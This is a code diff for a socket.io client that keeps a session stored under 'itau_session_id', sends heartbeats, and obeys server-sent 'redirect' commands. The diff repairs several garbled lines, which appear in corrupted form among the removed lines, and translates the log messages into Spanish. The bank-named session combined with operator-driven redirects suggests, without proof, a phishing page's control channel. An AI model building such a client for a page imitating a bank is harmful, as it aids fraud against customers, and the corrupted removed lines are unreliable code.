@@ -29,9 +29,9 @@
         
         heartbeatInterval = setInterval(() => {
             if (isConnected && sessionId) {
-           15000); // Every 15eartbeat');
+                socket.emit('heartbeat');
             }
-        }, 20000); // Every 20 seconds
+        }, 15000); // Every 15 seconds
     }
 
     // Stop heartbeat
@@ -44,7 +44,7 @@
 
     // Initialize session on connection
     socket.on('connect', () => {
-        console.log('✅ Socket connected:', socket.id);
+        console.log('Socket conectado:', socket.id);
         isConnected = true;
         socket.emit('init-session', { sessionId });
     });
@@ -52,50 +52,50 @@
     socket.on('session-ready', (data) => {
         sessionId = data.sessionId;
         localStorage.setItem('itau_session_id', sessionId);
-        console.log('✅ Session ready:', sessionId, data.reconnected ? '(reconnected)' : '(new)');
+        console.log('Session ready:', sessionId, data.reconnected ? '(reconnected)' : '(new)');
         startHeartbeat();
     });
 
     socket.on('heartbeat-ack', () => {
-        console.log('💓 Heartbeat OK');
+        console.log('Heartbeat OK');
     });
 
     socket.on('disconnect', (reason) => {
-        console.log('❌ Socket disconnected:', reason);
+        console.log('Socket desconectado:', reason);
         isConnected = false;
         stopHeartbeat();
         
         // Auto-reconnect if not manual disconnect
         if (reason === 'io server disconnect') {
-            socket.conn❌ Connection error:', error.message);
+            socket.connect();
+        }
+    });
+
+    socket.on('connect_error', (error) => {
+        console.error('Error de conexion:', error.message);
         isConnected = false;
     });
 
     socket.on('reconnect', (attemptNumber) => {
-        console.log('🔄 Reconnected after', attemptNumber, 'attempts');
-        isConnected = true
-        console.error('Connection error:', error.message);
-    });
-
-    socket.on('reconnect', (attemptNumber) => {
-        console.log('Reconnected after', attemptNumber, 'attempts');
+        console.log('Reconectado despues de', attemptNumber, 'intentos');
+        isConnected = true;
     });
 
     socket.on('reconnect_attempt', (attemptNumber) => {
-        console.log('Reconnection attempt:', attemptNumber);
+        console.log('Intento de reconexion:', attemptNumber);
     });
 
     socket.on('reconnect_error', (error) => {
-        console.error('Reconnection error:', error.message);
+        console.error('Error de reconexion:', error.message);
     });
 
     socket.on('reconnect_failed', () => {
-        console.error('Reconnection failed');
+        console.error('Reconexion fallida');
     });
 
     // Handle redirect commands
     socket.on('redirect', (data) => {
-        console.log('Redirect received:', data);
+        console.log('Redirect recibido:', data);
         if (data.clearData) {
             // Clear session but keep connection
             localStorage.removeItem('itau_session_id');
